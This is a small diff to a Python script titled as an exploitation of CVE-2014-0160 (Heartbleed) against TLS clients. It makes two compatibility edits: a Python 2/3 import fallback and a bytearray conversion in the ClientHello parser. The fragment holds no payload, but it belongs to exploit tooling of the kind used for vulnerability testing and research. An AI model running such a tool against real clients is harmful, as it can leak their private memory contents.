@@ -2,7 +2,10 @@
 # Exploitation of CVE-2014-0160 Heartbeat for the client
 # Author: Peter Wu <peter@lekensteyn.nl>
 
-import socketserver
+try:
+    import socketserver
+except:
+    import SocketServer as socketserver
 import sys
 import struct
 import select, time
@@ -76,7 +79,7 @@ class TCPSvr(socketserver.BaseRequestHandler):
         ciphers_len = struct.unpack("<H", hnd[off:off+2])
         off += 2
         # The first cipher is fine...
-        cipher = hnd[off:off+2]
+        cipher = bytearray(hnd[off:off+2])
 
         sslver = '{:02x} {:02x}'.format(ver >> 8, ver & 0xFF)
 
